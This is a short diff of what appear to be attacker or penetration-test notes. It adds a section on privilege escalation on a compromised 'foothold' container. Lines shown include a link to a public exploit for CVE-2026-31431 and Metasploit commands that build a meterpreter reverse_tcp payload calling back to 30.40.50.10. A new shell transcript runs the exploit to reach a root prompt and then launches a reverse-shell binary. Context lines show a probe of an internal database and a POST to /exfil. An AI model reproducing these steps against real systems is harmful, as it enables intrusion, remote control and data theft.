@@ -1359,9 +1359,8 @@ foothold@e5316a5b004d:/tmp$ curl -v telnet://adv-collector-db:5432
 172.18.0.1 - - [09/Jun/2026:13:01:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
 ```
 
-## privesc on foothold?
+## privesc on foothold and get a better shell
 - [copy-fail-CVE-2026-31431/copy_fail_exp.py at main · theori-io/copy-fail-CVE-2026-31431 · GitHub](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
-### or
 ```
 msf > use payload/linux/x64/meterpreter/reverse_tcp 
 msf payload(linux/x64/meterpreter/reverse_tcp) > set LHOST 30.40.50.10
@@ -1399,6 +1398,13 @@ sessions 1
 
 ```
 
+```
+foothold@e5316a5b004d:/tmp$ python cf.py
+# cd ~
+: 1: cd: can't cd to ~
+# cd /home/foothold
+# ./rev
+```
 ## 
 ```
 
